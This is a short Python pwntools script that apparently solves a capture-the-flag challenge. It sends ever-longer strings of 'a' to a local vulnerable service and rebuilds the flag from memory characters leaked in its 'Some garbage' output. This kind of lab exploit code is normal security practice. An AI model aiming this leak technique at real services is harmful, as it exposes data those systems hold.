from pwn import *
import re

# Reduce noise
context.log_level='error'

# Path to the compiled CTF challenge binary
binary_path = '../vuln'

flag_complete = False

# Function to run the binary with a specific input and capture the response
def get_reply_segment(payload):
    # Start the process
    # proc = process([binary_path])
    proc = remote('localhost',32770)
    proc.sendline(payload)
    # Read the output until we get to the reply buffer segment
    try:
        output = proc.recvall().decode()
    except: #If bad output assume .
        output = "."
    proc.close()
    
    # Use a regex to capture the reply buffer segment
    match = re.search(r'Some garbage: (.+)', output)
    if match:
        return match.group(1)
    else:
        return None

# Keep running the binary with increasing payload lengths to gather flag characters
input_length = 1
reconstructed_flag = ''

while not flag_complete:
    # Generate a payload of increasing length
    payload = b'a' * input_length
    segment = get_reply_segment(payload)
    
    # If no segment is found, continue to the next attempt
    if segment is None:
        input_length += 1
        continue

    # Analyze the segment for any flag characters (non-dot characters)
    for i, char in enumerate(segment):
        if char != '.':
            # Place the character in the flag array if it's not already discovered
            reconstructed_flag += char
    # Print the flag and also check if the last character is there
    print(f"THE FLAG TILL NOW IS: {reconstructed_flag}")
    if "}" in reconstructed_flag:
        flag_complete = True

    # Increment the input length for the next round to explore different positions
    input_length += 1

# Print the reconstructed flag after completing the loop
print(f"Reconstructed Flag: {reconstructed_flag}")
